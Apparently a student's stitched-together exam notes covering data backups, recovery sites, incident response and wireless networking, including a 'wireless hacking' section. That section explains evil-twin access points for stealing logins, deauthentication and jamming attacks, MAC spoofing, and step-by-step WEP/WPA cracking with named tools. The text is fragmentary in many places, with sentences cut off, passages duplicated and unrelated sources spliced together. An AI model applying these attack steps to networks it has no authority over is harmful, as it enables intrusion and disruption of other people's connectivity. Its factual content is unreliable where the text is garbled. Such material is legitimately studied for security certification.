the number of files is usually large, the change after initial creation is relatively small.
By doing a regular backup on user systems, you can protect these documents and ensure that they’re recoverable in the event of a loss.
In a large organization, backing up user files can be an enormous task. Fortunately, most operating systems date-stamp files when they’re modified.
If backups that store only the changed files are created, keeping user files safe becomes a relatively less painful process for an organization.
Many organizations have taken the position that backing up user files is the user’s responsibility. Although this policy decision saves administrative time and media, it isn’t a good idea. Most users don’t back up their files on a regular basis—if at all. With the cost of media being relatively cheap, including the user files in a backup every so often is highly recommended.
Applications
Applications usually don’t change on a frequent basis.
change or upgrade usually accomplished across an entire organization.
You wouldn’t necessarily need to keep a copy of the word processing application for each user, but you should keep a single up-to-date version that is available for download and reinstallation.
Some commercial applications require that each copy of the software be registered with a centralized license server. This may present a problem if you attempt to use a centralized recovery procedure for applications. Each machine may require its own copy of the applications for a recovery to be successful.
the Backup Types Full Backup:
  - a complete, comprehensive backup of all files on a disk or server.
  - During full backup, every single file on the system is copied over, and the
archive bit on each file is turned off.
  - The archive bit: a flag, turned on when the file is created or accessed.
  - current only at the time it’s performed:
  - a complete archive of the system at that point in time.
  - system shouldn’t be in use while it undergoes a full backup because some files may not get backed up.
  - Once the system goes back into operation, the backup is no longer current.   - A full backup can be a time-consuming process on a large system. Incremental Backup:
  - a partial backup
  - stores only the information that has been changed since the last full or the
last incremental backup.
  - Example:
  - full backup on Sunday night
  - incremental backup done on Monday night, contain only the information that changed since Sunday night.
  - An incremental backup: backs up only files that have the archive bit turned on.
  - identify which files have changed or created.
  - At the conclusion of the backup, the archive bit is turned off for all
the files that were included in the backup.
  - Each incremental backup must be retained until a full backup can be performed.
  - Restore:
  - All copies of incremental backups made since the
last full backup
  - Copy of the last full backup.
  - use the word “tape” even when a different storage medium is used,
the concept is still the same.
  - usually the fastest backups to perform on most systems
  - each incremental backup tape is relatively small (smaller than a full backup)
Differential Backup:
  - Similar to incremental backup, but backs up any files that have been  altered since the last full backup;
  - it makes duplicate copies of files that haven’t changed since the last
differential backup.
  - Example:
  - full backup on Sunday night,
  - differential backup performed on Monday night: capture the
information that was changed on Monday.
  - differential backup completed on Tuesday night: record the changes in any files from Monday and any changes in files on Tuesday.
  - during the week each differential backup would become larger; by Friday or Saturday night, it might be nearly as large as a full backup.
  - This means that the backups in the earliest part of the weekly cycle will be very fast, whereas each successive one will be slower.
Hierarchical storage management (HSM:
  - provides continuous online backup by using optical or tape jukeboxes.
  - It appears as an infinite disk to the system, and it can be configured to
provide the closest version of an available realtime backup.
  - So rather than using one of the three traditional backup strategies, you ensure that data is being continuously backed up.
  - The acronym HSM is used for more than one security-related entity. Not only storage management, but for hardware security module as well—a method of transient cryptographic key exchange. If you see a test question on HSM, make sure to read it carefully in order to know with which meaning it is being associated before answering.
When these backup methods are used in conjunction with each other, the risk of loss can be greatly reduced, but you can never combine incremental and differential backups in the same set.
determining which to use is time:
in an ideal situation, a full backup would be performed every day. Several commercial backup programs support these three backup methods. You must evaluate your organizational needs when choosing which tools to use to accom- plish backups.
Almost every stable operating system contains a utility for creating a copy of the configuration settings necessary to reach the present state after a disaster and for resetting to them.
In Windows 10: accomplished with System Restore.
SUSE Linux: Log in as root and start YaST, Choose System and System Backup.
 ̊
Backup Plan
Several common models are used in designing backup plans. Each has its own advantages and disadvantages. Numerous methods have been developed to deal with archival backup; most of them are evolutions of the three models discussed here:
Grandfather, Father, Son Method The Grandfather, Father, Son method is based on the philosophy that a full backup should occur at regular intervals, such as monthly or weekly. This method assumes that the most recent backup after the full backup is the son. As newer backups are made, the son becomes the father, and the father, in turn, becomes the grand- father. At the end of each month, a full backup is performed on all systems. This backup
is stored in an offsite facility for a period of one year. Each monthly backup replaces the monthly backup from the previous year. Weekly or daily incremental backups are per- formed and stored until the next full backup occurs. This full backup is then stored offsite, and the weekly or daily backup tapes are reused (the January 1 incremental backup is used on February 1, and so on).
This method ensures that in the event of a loss, the full backup from the end of the last month and the daily backups can be used to restore information to the last day. Figure 12.2 illustrates this concept. The annual backup is referred to as the grandfather, the monthly backup is the father, and the weekly backup is the son. The last backup of the month becomes the archived backup for that month. The last backup of the year becomes the annual backup for the year. Annual backups are usually archived; this allows an organiza- tion to have backups available for several years and minimizes the likelihood of data loss. It’s a common practice for an organization to keep a minimum of seven years in archives.
The last full backup of the year is permanently retained. This ensures that previous years’
information can be recovered if necessary.
The major difficulty with this process is that a large number of tapes are constantly flow- ing between the storage facility and the computer center. In addition, cataloging daily and weekly backups can be complicated. It can become difficult to determine which files have been backed up and where they’re stored.
Although the Grandfather, Father, Son method is the most common, and the one on which you will be tested, other obscure methods exist. One such method is called the Tower of Hanoi method. It is based on a mathe- matical word problem called the Tower of Hanoi. The details of this method are not important for the Security+ exam.
 Full Archival Method The Full Archival method works on the assumption that any infor- mation created on any system is stored forever. All backups are kept indefinitely using some form of backup media. In short, all full backups, all incremental backups, and any other backups are permanently kept somewhere.
This method effectively eliminates the potential for loss of data. Everything that is created on any computer is backed up forever. Figure 12.3 illustrates this method. As you can see, the number of copies of the backup media can quickly overwhelm your storage capabilities. Some organizations that have tried to do this have needed entire warehouses to contain their archival backups.
Think about the number of files your organization has: how much storage media would be required to accomplish full archiving? The other major problem involves keeping records of what information has been archived. For these reasons, many larger companies don’t find this to be an acceptable method of keeping backups.
 Backup Server Method The costs of disk storage and servers have fallen tremendously over the past few years. Lower prices have made it easier for organizations to use dedicated servers for backup. The Backup Server method establishes a server with large amounts
of disk space whose sole purpose is to back up data. With the right software, a dedicated server can examine and copy all the files that have been altered every day.
Figure 12.4 illustrates the use of backup servers. In this instance, the files on the backup server contain copies of all the information and data on the APPS, ACCTG, and DB serv- ers. The files on the three servers are copied to the backup server on a regular basis; over time, this server’s storage requirements can become enormous. The advantage of this method is that all backed-up data is available online for immediate access.
 This server can be backed up on a regular basis, and the backups can be kept for a speci- fied period. If a system or server malfunctions, the backup server can be accessed to restore information from the last backups performed on that system.
Backup servers don’t need overly large processors; however, they must have large disk and other long-term storage media capabilities. Several software manufacturers take backup servers one additional step and create hierarchies of files. Over time, if a file isn’t accessed, it’s moved to slower media and may eventually be stored offline. This helps reduce the disk storage requirements, yet it still keeps the files that are most likely to be needed for recovery readily available.
Many organizations use two or more of these methods to back up systems. The issue becomes one of storage requirements and retention requirements. In establishing a backup plan, you must ask users and managers how much backup (in terms of frequency, size of files, and so forth) is really needed and how long it will be needed.
Make sure that you obtain input from all who are dealing with govern- mental or regulatory agencies. Each agency may have different archival requirements, and compliance violations can be expensive. Both HIPAA and Sarbanes-Oxley are affecting—and driving—archival and disposal poli- cies around the nation.
Recovery Sites recovery sites, alternate sites, or backup sites.
Hot Site (active backup model)
a location that can provide operations within hours of a failure.
  -   - ⁃
would have servers, networks, tele equipment in place to reestablish service in a short time.
provide network connectivity, systems, and preconfigured software to meet the needs of an organization.
may also double as an offsite storage facility, providing immediate access to archives and backup media.
Databases can be kept up-to-date using network connections.
expensive, primarily suitable for short-term situations.
Many hot sites also provide office facilities and other services so that a business can relocate a small number of employees to sustain operations.
Given the choice, every organization would choose to have a hot site. Doing so is often not practical, however, on a cost basis.
Warm Site (active/active model)
provides some of the capabilities of a hot site, but it requires the customer to do more
work to become operational.
  - provide computer systems and compatible media capabilities.
  - administrators and other staff will need to install and configure systems to resume operations. facility, or another organization with which yours has a reciprocal agreement.
  - An agreement between two companies to provide services in the event of an emergency is called a reciprocal 互惠的 agreement.
  - Usually, these agreements are made on a best-effort basis; there is no guarantee that services will be available if the site is needed.
  - Make sure that your agreement is with an organization that is outside of your geographic area.
  - If both sites are affected by the same disaster, the agreement is worthless. Warm sites may be for your exclusive use, but they don’t have to be.
  - requires more advanced planning, testing, and access to media for system recovery.
  - represent a compromise between a hot site, which is very expensive, and a cold site, which isn’t preconfigured.
Cold Site
a facility that isn’t immediately ready to use.
  - The major challenge: the customer must provide all the capabilities and
do all the work to get back into operation.
  - The organization using it must bring along its equipment and network.
  - may provide network capability, but this isn’t usually the case;
  - the site provides a place for operations to resume
  - but it doesn’t provide the infrastructure to support those operations.
Cold sites work well when an extended outage is anticipated.
least expensive, but they require the most advanced planning, testing, and resources to become operational—occasionally taking up to a month to make operational. garage for a short time. Although this may be a practical solution,
it also opens up risks that you must consider. example, while you’re operating from your garage, will the servers be secure should someone break in?
Cloud-based Site
Business is always operational with the least amount of man hours needed.
The likelihood that you’ll need any of these facilities is low:
most organizations will never need to use these types of facilities.
The costs are usually based on a subscription or other contracted relationships, and it’s difficult for most organizations to justify the expense. In addition, planning, testing, and maintaining these facili- ties is difficult; it does little good to pay for any of these services if they don’t work and aren’t available when you need them.
One of the most important aspects of using alternative sites is documen- tation. To create an effective site, you must have solid documentation of what you have, what you’re using, and what you need in order to get by.
Management must view the disaster-recovery plan as an integral part of its business continuity planning (BCP). Management must also provide the resources needed to implement and maintain an alternative site after the decision has been made to contract for the facilities. It is their responsibility to factor geographic distance into their selection criteria and include travel-related costs associated with the distance.
Incident Response Procedures
incident response plan (IRP) / procedures: define how an organization should respond to an incident. It’s important that an incident response plan establish at least the following items:
Guidelines for documenting the incident type and defining its category: list(s) of information that should be collected about an incident and the procedures to gather and secure evidence.
Resources used to deal with an incident.
Defined roles and responsibilities for those who are involved in the investigation and response. This should identify members of the cyber-incident response team(s).
Reporting requirements and escalation procedures including a list of outside agencies that should be contacted or notified and outside experts who can be used to address issues if needed.
According to CERT, a Computer Security Incident Response Team (CSIRT) can be a formalized or an ad hoc team. You can toss a team together to respond to an incident after it arises, but investing time in the development process can make an incident more manage- able. Many decisions about dealing with an incident will have been considered in advance. Incidents are high-stress situations; therefore, it’s better to simplify the process by consider- ing important aspects in advance. If civil or criminal actions are part of the process, evi- dence must be gathered and safeguarded properly.
Let’s say that you’ve just discovered a situation where a fraud has been perpetrated internally using a corporate computer. You’re part of the investigation team. Your incident response policy lists the specialists that you need to contact for an investigation. Ideally, you’ve already met the investigator or investigating firm, you’ve developed an understand- ing of how to protect the scene, and you know how to deal properly with the media (if they become involved).
The six steps of any incident response process should be as follows:
Preparation Identification
Containment 控制, 抑制 Eradication 摧毁,根除 ▪


## Recovery Lessons learned
Step 1: Identifying the Incident
Step 2: Investigating the Incident: involves searching logs, files, and any
other sources of data about the nature and scope of the incident.
Step 3: Recovery/Repairing the Damage
Step 4: Documenting and Reporting the Response Step 5: Adjusting Procedures
 Firewall:
  - access-list 179 permit tcp 192.168.77.0 0.0.0.255 192.168.77.3 0.0.0.0
Snort:
  - log tcp !192.168.0/24 any -> 192.168.0.33 (msg: "mounted access" ; )
 Securing Wireless Networks
1. A wireless network is built with the same concerns
- the physical makeup of the transmitter and receiver (NIC) and how they talk to one another.
- order imposed on how clients communicate to avoid collisions and useless chatter.
- rules for authentication, data transfer, size of packets, and so on.
1. Choose 802.11
2. Choose transmission methods
3. Installed a wireless access point and created a network for clients to connect to.
4. authenticate client so an IP address can be pulled
Wireless Hacking
When it comes to hacking wireless networks, the truly great news is you may not have much of it to do. Many networks have no security configured at all, and even those that do have security enabled don’t have it configured correctly.
- According to studies recently published by the likes of the International Telecommunications Union (ITU) and other equally impressive organizations, more than half of all wireless networks don’t have any security configured at all, and of the remainder, nearly half could be hacked within a matter of seconds. - wireless communication is expected to grow tenfold within the next few years. Gentlemen, and ladies, start your engines.
Finding wireless networks to hack.
- finding any wireless network—that’s too easy.
- But find the wireless network you’re looking for—the one that’s going to get your team inside the target and provide you with access to all the goodies.
war driving: use of a service such as WIGLE (http://wigle.net) and to get a glimpse into someone’s smartphone.
WIGLE users register with the site and use NetStumbler in their cars, with an antenna and a GPS device, to drive around and mark where wireless networks can be found. Smartphones generally retain identifiers and connection details for networks their owners connect to.
War flying: involves airplanes. the wireless adapter.
- No matter how great the tool is, if the wireless adapter can’t pull the frames out of the air in the correct manner, all is lost.
- Some tools are built this way and work only with certain chipset adapters, which can be frustrating at times.
- Example:
- AirPcap dongle: a USB wireless adapter that offers all sorts of advantages and software support.   - Aircrack-ng and other sniffing/injection wireless hacking applications,
  - provides a useful software distribution.
  - AirPcapReplay: offers the ability to replay traffic from a
captured file across the wireless network.
  - Figure 7-2 AirPcap USB NOTE
- Want another reason to get a specially made card for wireless snooping?
- A big benefit of many specially crafted cards is a rather significant boost in radio strength.
- Some are in the 750mW range, representing roughly three times the power you’d have with your “normal” card.
- Also, many will have independent connectors for transmit and receive antennas, which makes this all the more fun and effective.
Barring this, research and download new and different drivers for your
 particular card.
- The madwifi project may be an answer for you (http://madwifi-
project.org).
- At any rate, much like the ability of wired adapters to use promiscuous mode for your sniffing efforts, not all wireless adapters are created equal, and not all will work with your favorite tool. Be sure to check the user guides and man pages for lists and tips on correctly configuring your adapters for use.
NOTE Although people often expect any wireless card to do the trick, it simply won’t, and frustration begins before you ever get to sniffing traffic, much less hacking. I have it on good authority that, in addition to those mentioned, Ubiquiti cards (www.ubnt.com/) may be the top-tier card in this realm.
Network discovery tool
I’ve already made mention of WIGLE (http://wigle.net) and how mapped out wireless network locations using GPS and a tool called NetStumbler.
- NetStumbler (www.netstumbler.com): can be used for identifying poor coverage locations within an ESS, detecting interference causes, and finding any rogue access points in the network.
- Windows based, compatible with 802.11a, b, and g.  Kismet: another wireless discovery option.
- wireless packet analyzer/sniffer
- Linux-based systems
- unlike NetStumbler, works passively, meaning it detects access points and clients without actually sending any packets.
- can detect access points that have not been configured (and would then be susceptible to the default out-of-the-box admin password)
- will determine which type of encryption you might be up against.
- interesting notables about Kismet on your exam: First, it works by “channel hopping” to discover as many networks as possible. Second, it has the ability to sniff packets and save them to a log file, readable by Wireshark or tcpdump. NetSurveyor: great network discovery tool
- free Windows-based tool
- provides many of the same features as NetStumbler and Kismet.
- supports almost all wireless adapters without any significant additional configuration, which is of great benefit to hackers don’t have, an AirPcap card.
- a great tool for troubleshooting and verifying proper installation of wireless networks.
- Download, install and run. It will automatically find your wireless adapter and begin scanning. Click through the different menu options and check out all the information it finds without you needing to configure a thing!
  Other options for network discovery: - WeFi (www.wefi.com) and Skyhook (www.skyhookwireless.com): GPS mapping wireless finder.
Attacks
rogue access point:
- referred as “evil twin” (assuming the SSID on the rogue box is set similar to the legitimate one), an attack like this is incredibly easy to pull off.
- referenced as mis-association attack.
- “honeyspot” attack: faking a well-known hotspot on a rogue AP
(McDonald’s, Starbucks...)
- place an access point of your own somewhere— heck, you can even put it outside in the bushes—and have legitimate users connect to your network instead of the original.
- If someone connect to yours wireless networks, he’s basically signing over control to you.
  - You could configure completely new DNS servers and have your AP configure them with the DHCP address offering.
  - route users to fake websites you create, providing opportunities to steal authentication information.
  - funnel everything through a packet capture.
- The only drawback: sometimes really easy to see, and you run a pretty substantial risk of discovery. You’ll just have to watch out for true security-minded professionals because they’ll be on the lookout for rogue APs on a continual basis and (should) have plenty of tools available to help them do the job.
 NOTE
Cisco, the leaders in rogue access point detection technologies.
- Many of its access points can be configured to look for other access points in the same area.
- If they find one, they send SNMP or other messages back to administrators for action, if needed.
- The link here provides more information, in case you’re interested:
www.cisco.com/en/US/tech/tk722/tk809/ technologies_white_paper09186a0080722d8c.shtml.
ad hoc connection attack
- it shouldn’t ever be successful, but after years in the security management business, I’ve seen users do some pretty wild things
- occurs when an attacker simply sits down with a laptop somewhere in your building and advertises an ad hoc network from his laptop.
- Believe it or not, people will connect to it.
DoS wireless attack:
Another attack on the relatively easy side of the spectrum is the denial- of-service effort.
- use tools to craft and send de-authenticate (disassociate) packets to clients of an AP, force them to drop their connections. performing the same action again.
  - Or you employ a rogue AP to have legitimate users connect
  - thereby removing their access to legitimate networked resources (in ECC lingo, an unauthorized association).
- Jam the wireless signal altogether, using jamming device and, usually, a high-gain antenna/amplifier.
  - All wireless devices are susceptible to some form of jamming and/or interference—it’s simply a matter of placing enough signals out in the airwaves that the NICs can’t keep up.
  - Tons of jammer options are available (wireless jammers), ranging from 802.11 networks to Bluetooth and other wireless networking technologies.
  - anything generating enough signals in the 2.4GHz range would definitely put a crimp in an 802.11b network.
One defense for wireless network administrator: enforce a MAC filter.
- a list of MAC addresses that are allowed to associate to the AP;
- if wireless NIC’s address isn’t on the list, you’re denied access.
- To break:
- The easy way around this, monitor the network to figure out which MAC addresses are in use on the AP and simply spoof one of them.
- Unix/Linux machine, log in as root, disable the interface, enter a new MAC, and re-enable the device:  ⁃
Tools for MAC spoofing.
- SMAC and TMAC.
- change the MAC address with just a couple of clicks and, once you’re done, to return things to normal with a click of the mouse.
A Cautionary Jamming Note
  One of the goals for many illegitimate hackers is the plain old denial-of- service (DoS) attack. Whether it’s a resource, machine, segment, or entire network, sometimes shutting down communication is just as valuable to the bad guys as leaving it up and stealing things (especially in the military world).
detection and defense options to prevent DoS attacks to the wireless
world?
 FCC rules and the Communication Act of 1934 make the marketing, selling, and/or using a jammer a federal offense and can result in seriously nasty punishment.
- almost any electronic device will be an FCC warning saying that it will not create interference and that it will accept all interference.
- However, that doesn’t mean you can’t get a hold of these jammers. - Example
- MGT P6 Wifi (www.magnumtelecom.com/Pages/gb/jammers.htm)    - a small device about the size of a cell phone
  - can effectively shut down all Wi-Fi communication within a
20-meter radius.
  - That may not sound like much, but if you’ve ever seen what happens in a board room when communications go down, you’d be nodding in agreement with me now that it’s
something to be concerned about.
 If you increased the power output of that little device? have four or five of them to disperse around particularly important networked areas in an organization?
- Do you think that maybe causing a communications blackout for certain people in an organization might have an impact on their mission?
- How about its effect on social engineering opportunities? I can guarantee you if whatever floor starts having communications
problems, reverse social engineering opportunities abound.
 what if an entire 4G network within a city? it could really happen.
- A recent study at Virginia Tech proposed that a high-speed LTE network could be brought down across city blocks via a briefcase- sized device costing around $650.
- Because the delivery of the LTE signal depends on a small portion of the overall signal (the control instructions make up less than 1 percent), blocking those instructions effectively destroys the entire
signal. After all, if your phone can’t sync, it can’t send or receive
anything.
 The good news: the availability of these types of devices is somewhat limited.  The bad news: not very well controlled or regulated, and money talks.
Wireless Encryption Attacks
Cracking WEP is ridiculously easy and can be done with any number of tools.
- The idea: revolves around generating enough packets to effectively guess the encryption key.
- The weak initialization vectors, reused and sent in clear text. Regardless of the tool, the standard WEP attack steps:
1. Start a compatible wireless adapter on your attack machine and ensure it can both inject and sniff packets.
2. Start a sniffer to capture packets.
3. Use some method to force the creation of thousands and thousands
of packets (generally by using “de-auth” packets).
4. Analyze these captured packets (real time or on the side) with a
cracking tool.
No specific tools, each situation is unique, specific tool may not work for you at your location. This tends to lead to confusion and angst. The best advice: practice yourself. hacking your own WAP (just make very sure you own it
WEP is easy to crack, tools are available for doing so. - The Aircrack-ng suite of tools   - Aircrack-ng holds all sorts of goodies inside (a sniffer, a wireless network detector, a password cracker, and even a traffic analysis tool) can run on both Windows and Linux.
  - Aircrack uses different techniques for cracking different encryption standards.
  - use a dictionary technique for cracking WPA and WPA2.
  - The other weird techniques are reserved for cracking WEP. it can use a dictionary technique or a variety of weirdly named algorithmic processes called PTW, FMS, and the Korek technique.
- Cain and Abel do it easily
  - sniffing packets and cracking as stated earlier, although it
may take a little longer than some other tools.
  - relies on statistical measures and the PTW technique to break WEP codes.
- KisMAC (Mac application) to brute-force WEP or WPA passwords.
- WEPAttack (wepattack.sourceforge.com),
- WEPCrack (wepcrack.sourceforge.com),
- Portable Penetrator (a mobile tool of all things, www.secpoint.com),
- Elcomsoft’s Wireless Security Auditor tool. WPA and WPA2 are exponentially more difficult. alongside a constantly changed temporal key to provide protection.
- In WPA, the cracking is really hard and comes down to one thing: brute force, like WEP, force a bunch of packets to be sent and store them, then run them through an offline cracker (like Aircrack) to brute-force against those packets until you’re successful.
- It will take a lot longer than cracking WEP, but just remain patient.
- WPA2 is even worse, as you’ll have to deal with the additional
authentication mechanism (RADIUS and such).
- If the AES key stinks in the first place, your job will be much easier, but if half an effort is given to making it good in the first place, then...well, good luck with that.
Wireless Sniffing
sniffing a wireless network is the same as sniffing its wired counterpart.
- The same protocols and authentication standard weaknesses you looked for with Wireshark off that switch port are just as weak and vulnerable on wireless.
- Authentication information, passwords, and all sorts of information can be gleaned just from watching the air, and although you are certainly welcome to use Wireshark, a couple of tools can help you get the job done.
a few of the tools specifically made for wireless sniffing: NetStumbler and Kismet
WiFi Pilot. OmniPeek
- a well-known wireless sniffer.
- have a wireless adapter that is compatible and can watch things in
promiscuous mode.
- In addition to the same type of traffic analysis you would see in Wireshark, OmniPeek provides network activity status and monitoring in a nice dashboard for up-to-the-minute viewing.
AirMagnet WiFi Analyzer:
- an incredibly powerful sniffer, traffic analyzer, and all-around
wireless network-auditing software suite.
- can be used to resolve performance problems and automatically detect security threats and vulnerabilities.
- only suite of active WLAN diagnostic tools, enabling network managers to easily test and diagnose dozens of common wireless network performance issues including throughput issues, connectivity issues, device conflicts and signal multipath problems.
- AirMagnet includes a compliance reporting engine that maps network information to requirements for compliance with policy and industry regulations.
sniffing is beneficial to wired and wireless network attacks, and you need to be able to recognize the tools mentioned here.
- download these tools. fire them up and see what you can capture. Wireless Terminology, Architecture, and Standards
A wireless network is built with the same concerns
- the physical makeup of the transmitter and receiver (NIC) and how they talk to one another.
- order imposed on how clients communicate to avoid collisions and useless chatter.
- rules for authentication, data transfer, size of packets, and so on. In the wireless data world, these are all defined with standards, the
802.11 series.
EXAM TIP
802.11i: an amendment to the original 802.11 series standard and specifies security mechanisms for use on the wireless LAN (WLAN).
802.16 was written for the global development of broadband wireless metropolitan area networks. Referred to as “WiMax,” it provides speeds up to 40 Mbps and is moving toward gigabit speed.
The method wireless networks use to encode messages onto the media in
 ▪


## use
- Wired: encode using various properties of the electrical signal or,
fiber, the light wave;
- Wireless: nothing physical for the machine to “touch.”
  - Modulation (the practice of manipulating properties of a waveform) then becomes the encoding method of choice.
  - There are endless methods of modulating a waveform to carry a signal
  - two you’ll need to know in wireless, OFDM and DSSS (QAM is very new and isn’t touched on your exam).
Transmission Methods
the frequencies used for various wireless channels: those frequencies are center frequencies of a channel.
In actual operation, a channel uses more than one frequency, a transmission method, spread spectrum 頻谱
These frequencies are very close to one another, results in a narrowband transmission.
The three variations of spread-spectrum 波谱 technology for study of WLANs:
Direct-sequence spread spectrum (DSSS) 直接序列展頻: Modulates data over an entire range of frequencies
   ▪


##  more subject to environmental factors, as opposed to FHSS and OFDM.
using a series symbols called chips.
  - A chip is shorter in duration than a bit
  - chips are transmitted at a higher rate than the actual data.
  - These chips encode the data to be transmitted, appears to be random data.
Both parties involved in a DSSS communication know which chips represent actual data and which chips do not,
if a third party intercepted a DSSS transmission,
difficult to eavesdrop in on the data, not easily know which chips represented valid bits.
Frequency-hopping spread spectrum (FHSS):
Allows the participants in a communication to hop between predetermined frequencies.
Security is enhanced
the participants can predict the next frequency to be used while a third party cannot easily predict the next frequency.
FHSS can also provision extra bandwidth by simultaneously using more than one frequency.
       ▪


## Orthogonal frequency division multiplexing (OFDM):
DSSS used a high modulation rate for the symbols it sends,
OFDM uses a relatively slow modulation rate for symbols.
  - slower modulation rate, combined with the simultaneous transmission of data over 52 data streams,
  - helps OFDM support high data rates while resisting interference between the various data streams.
Three wireless modulation techniques, only DSSS and OFDM are commonly used in today’s WLAN
Both orthogonal frequency-division multiplexing (OFDM) and direct- sequence spread spectrum (DSSS) use various pieces of a waveform to carry a signal, but they go about it in different ways
- Example: the cable plugged into the back of your TV is capable of carrying several different frequencies of waveforms. You watch one of these waveforms by tuning your TV specifically to that channel. the cable is split into various channels, with each one carrying a specific waveform.
OFDM works in this same manner, with several waveforms simultaneously carrying messages back and forth.
- the transmission media is divided into a series of frequency bands that don’t overlap each other, and each of them carry a separate
   signal.
DSSS works differently by combining all the available waveforms into a single purpose.
- The entire frequency bandwidth can be used at once for the delivery of a message.
- Both technologies accomplish the same goal, just in different ways.
AP
The significant challenge with wireless networks is security.
A wireless access point (AP): connects wireless clients to a wired network.
However, many APs also have routing capabilities.
Vendors commonly market APs with routing capabilities as wireless routers Two distinctions are:
  - All wireless routers are APs:
  - APs with extra capability—routing.
  - Not all APs are wireless routers:
  - Many APs do not have any additional capabilities.
  - They provide connectivity for wireless clients to a wired network, but do not have routing capabilities.  Wireless access point with routing capabilities (wireless router)
the wireless router has both a switch component and a router component,
The devices connect to the switch component and the router component provides connectivity to the Internet through a broadband modem or similar device depending on the Internet Service Provider (ISP) requirements.
Most APs include physical ports for wired access (like RJ-45 Ports) and a wireless transceiver for wireless clients.
The wired ports and wireless connections all connect through the switch component of the wireless router.
Many vendors label the Internet connection WAN for wide area network, but some vendors label this port as “Internet.”
the AP may includes extra services and capabilities:
routing, Network Address Translation (NAT), Dynamic Host Configuration Protocol (DHCP), and more...
These extra services reduce the setup time required for the WLAN. wireless networks broadcast on known frequency bands
other wireless users can often see them. This includes authorized users, curious neighbors, and attackers.
Fat vs Thin Access Points
fat AP / stand-alone, intelligent, or autonomous AP:
includes everything needed to connect wireless clients to a wireless network.
It typically includes features such as a routing component, NAT, DHCP, wireless security options, access control lists (ACLs), and more.
wireless network at home or small office, probably using a fat access point.
must be configured separately from each other
  - isn’t a problem if only configuring a single AP.
Consider a network that has a dozen APs spread around the organization. thin AP / controller-based AP:
isn’t stand-alone AP, managed and configured by a controller.
Administrators use a wireless controller to configure and manage it
This streamlines the administration by consolidating it in one place.
Also in small office and home networks
Example,
NETGEAR’s Orbi wireless router includes one fat AP and one or more thin satellite APs.
You configure the single AP and it then configures the satellite APs.
Band Selection and Channel Widths
Wireless networks use two primary radio bands: 2.4 GHz and 5 GHz. - wireless devices don’t transmit exactly on 2.4 GHz or 5 GHz. - have multiple channels starting at about 2.4 GHz and 5 GHz.
- There isn’t a single standard that applies to every country, so you’ll find that the number of channels within each band varies from country to country.
The Institute of Electrical and Electronics Engineers (IEEE) defines many standards, including the IEEE 802.11 group of wireless network protocols.
some common wireless standards along with the frequency band (or bands) they support.
It also shows the channel widths supported by each.
However, the channel widths are somewhat misleading.
example, 802.11n supports channel widths of both 20 MHz and 40 MHz. However, a 40 MHz channel is two combined 20 MHz channels.
802.11ac uses only the 5 GHz frequency band,
wider channels allow you to transfer more data through the channel.
Unfortunately, there are two challenges
First, when you increase the channel width, you decrease the distance of the radio transmissions.
  - device connects with a 20 MHz channel at a specific distance away might not be able to connect at 40 MHz from the same location.
Second, you increase the possibility of interference.
  - Wider channels are more likely to overlap with other wireless devices
and this interference affects overall performance.
These challenges are much more prevalent in the 2.4 GHz band because there are more technologies operating in this band.
 Example, Bluetooth devices, microwave ovens, and cordless phones operate in this range.
Additionally, the 2.4 GHz range has only three nonoverlapping channels.
APs typically allow you to choose the frequency band (2.4 GHz and/or 5 GHz).
Additionally, most APs allow you to manually select a channel or allow the AP to pick the best channel.
Access Point SSID
Wireless networks are identified by a service set identifier (SSID)
- the name of the wireless network.
- not a password and provides no security at all for your network.
  - SSIDs do nothing for security, other than identify which network you’re on.
- It is simply a text word (32 characters or less) that identifies your wireless network.
- SSIDs are broadcast by default and are easily obtainable even if you try to turn off the broadcast (SSID cloaking).
  - The SSID is part of the header on every packet, so its discovery by a determined attacker is a given, and securing it is virtually a moot point.
  - Some APs still come with default SSIDs: Linksys.
  - Some newer APs force you to enter a name for the SSID when you first
install it and do not include a default.
- Example
- a wireless network with an SSID of Linksys, the attacker has a good idea that the network is using a LinksysAP.
- If the attacker knows about specific weaknesses with this AP, he can start exploiting these weaknesses.
- On the other hand, an AP with an SSID of “Success” doesn’t give the attacker any clues about theAP. Disable SSID Broadcasting or Not
One of the goals of 802.11 wireless networks is ease of use.
The designers wanted wireless computers to be able to easily find each otherand
work together.
attackers can also easily find your networks.
By default, APs broadcast the SSID in cleartext, easy to locate wireless networks.
APs must regularly send out a beacon frame to ensure interoperability with other devices in the wireless network.
This beacon frame includes the SSID
  - if the SSID broadcast is disabled, the SSID entry is blank.
However, even if the SSID broadcast is disabled,
  - the AP includes the SSID in Probe responses sent in response to Probe
requests from authorized wireless clients.
an attacker with a wireless protocol analyzer can listen for the Probe responses
and detect the SSID.
disabling the SSID: makes a little more difficult for attackers to find your network, but not much.
it is possible to disable the SSID broadcast and hide the network from casual users.
However, an attacker with a wireless protocol analyzer can easily discover the SSID even if SSID broadcast is disabled.
Enable MAC Filtering
provides a small measure of security to a wireless network.
MAC address (physical / hardware address) is a 48-bit address used to identify
network interface cards (NICs).
displayed as six pairs of hexadecimal characters such as 00-16-EA-DD-A6-60. Every NIC, including wireless NICs, has a MAC address. MAC filtering:
a form of network access control.
It’s used with port security on switches and you can use it to restrict access to wireless networks.
 MAC filter on an AP on a NETGEAR Orbi AP.
the system is set to Permit PCs Listed Below to Access the Wireless Network.
The Status column shows that each of these devices is set to Allows, granting them access.
The Block all new devices from connecting: prevents any other devices from connecting.
Theoretically, MAC addresses are unique. sound secure:
but an attacker with a wireless sniffer can easily identify the MAC addresses
allowed in a wireless network. Additionally, it’s very easy to change a MAC address.
An attacker can launch a spoofing attack by changing the MAC address on his laptop to impersonate one of the allowed MAC addresses.
Many operating systems include built-in functionality to change NIC’s MAC address.
Example:
Windows 10: access the NIC’s properties from Device Manager, click the Advanced tab, and configure the Network Address setting with a new MAC.
basic wireless network setup
There are two main modes a wireless network can operate in.
- Ad hoc mode 無線隨意網路 : wireless devices connect to each other without an AP.
  - Example: 2 wireless laptops, you can create an ad hoc wireless network to connect your two computers. You create it as needed.
- infrastructure mode: connect to a wireless network via an AP
ad hoc: like the old point-to-point networks in the good old days.
- system connects directly to another system, as if a cable were strung between the two.
- shouldn’t see ad hoc networks appearing very often, but park yourself in any open arena (such as an airport or bus station) and see how many pop up.
Infrastructure mode: most networks are set up as.
- Whereas ad hoc connects each system one to another, wireless connections through.
- A wireless access point is set up to connect with a link to the outside world (usually some kind of broadband router). This is an important consideration when you think about it—wireless devices are usually on completely different subnets than their wired cousins. If you remember our discussion on broadcast and collision domains, you’ll see quickly why this is important to know up front.
- Clients connect to the access point using wireless NICs;
  - if the access point is within range and the device understands
